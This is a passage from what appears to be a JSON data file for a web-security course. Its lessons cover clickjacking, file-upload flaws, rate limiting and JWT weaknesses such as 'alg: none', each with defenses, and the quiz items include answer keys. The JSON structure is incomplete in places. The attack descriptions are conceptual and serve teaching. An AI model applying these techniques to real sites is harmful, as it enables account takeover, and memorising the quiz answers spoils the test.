      },
      "xp": 24,
      "credits": 10

    {
      "id": "w11",
      "title": "Clickjacking",
      "concept": "\n  <p><b>Clickjacking</b> tricks a user into clicking something different from what they perceive — typically by layering an invisible, legitimate page (via an iframe) on top of what looks like a harmless decoy page.</p>\n  <pre>What the user sees:      What's actually there:\n+------------------+      +------------------+\n| \"Click to win a  |      | [invisible iframe|\n|  free prize!\"    |      |  of bank.com's   |\n|    [ CLICK ]     |  =   |  \"Transfer $1000\"|\n|                  |      |  button, exactly |\n+------------------+      |  positioned]     |\n                           +------------------+</pre>\n  <p>The user thinks they're clicking a harmless button, but they're actually clicking a precisely overlaid, invisible button on the real (legitimate, logged-in) site underneath.</p>\n  <div class=\"callout\">Defense: the X-Frame-Options or Content-Security-Policy frame-ancestors header, which tells browsers \"never allow this page to be embedded in a frame at all.\"</div>",
      "check": {

        "q": "What is the core mechanism that makes clickjacking work?",

    {
      "id": "w12",
      "title": "File upload vulnerabilities",
      "concept": "\n  <p>Any feature letting users upload files is a meaningful attack surface if not carefully restricted. Common failure modes:</p>\n  <ul>\n    <li><b>No file type validation</b> — an attacker uploads a script file (like <code>.php</code>) disguised with an image extension, and if the server can be tricked into executing it, that's a path to full remote code execution.</li>\n    <li><b>Trusting client-side validation only</b> — checking file type in JavaScript is trivially bypassed; validation must happen server-side.</li>\n    <li><b>Uploads served from the same domain/execution context</b> — even a \"harmless\" uploaded file can enable stored XSS if served in a way the browser will execute.</li>\n  </ul>\n  <div class=\"callout warn\">Solid defenses: validate file type server-side by actual content (not just extension), rename uploaded files, store them outside the web root or on separate non-executing storage, and scan for malware.</div>",
      "check": {

        "q": "Why is client-side (JavaScript) file type validation alone insufficient?",

        "correct": 1,

      },

    {
      "id": "w13",
      "title": "Rate limiting & brute-force protection",
      "concept": "\n  <p>Without limits, an attacker can simply try passwords, discount codes, or API requests as fast as their infrastructure allows. <b>Rate limiting</b> caps how many requests a client can make in a given time window.</p>\n  <p>Common patterns:</p>\n  <ul>\n    <li><b>Account lockout</b> — after N failed login attempts, temporarily lock the account</li>\n    <li><b>Progressive delays</b> — each failed attempt adds increasing delay before the next is accepted</li>\n    <li><b>CAPTCHA challenges</b> — triggered after suspicious request patterns</li>\n    <li><b>IP/API-key based throttling</b> — limiting total requests per identity per time window</li>\n  </ul>\n  <div class=\"callout warn\">A subtlety: account lockout itself can be abused as a denial-of-service — an attacker deliberately failing logins on someone else's account just to lock them out. Good implementations balance this (e.g. lockout duration, or requiring additional verification instead of full lockout).</div>",
      "check": {

        "opts": [

          "It only works on mobile devices"

        "correct": 1,
        "explain": "This is a real, known tradeoff — naive lockout policies can be weaponized against the very users they're meant to protect."
      },

    {
      "id": "w14",
      "title": "JWTs & token-based authentication",
      "concept": "\n  <p>Modern apps (especially APIs) increasingly use <b>JWT (JSON Web Tokens)</b> instead of traditional server-side sessions. A JWT is a signed, self-contained piece of data:</p>\n  <pre>header.payload.signature\neyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoibGVvIn0.4a8f...</pre>\n  <p>The payload can hold claims like <code>{\"user\":\"leo\",\"role\":\"admin\"}</code>. The signature proves it hasn't been tampered with — assuming the signing key stays secret and a strong algorithm is used.</p>\n  <p>Common real vulnerabilities with JWTs:</p>\n  <ul>\n    <li><b>\"alg: none\" attack</b> — some libraries historically accepted a token claiming \"no signature algorithm used\" at face value, letting attackers forge unsigned tokens</li>\n    <li><b>Weak/leaked signing secrets</b> — if the secret used to sign tokens leaks or is guessable, anyone can forge valid tokens claiming to be any user</li>\n    <li><b>Sensitive data in the payload</b> — JWT payloads are typically only base64-encoded, NOT encrypted, so they're readable by anyone who has the token</li>\n  </ul>",
      "check": {

        "q": "Is the payload of a standard JWT encrypted?",
        "opts": [
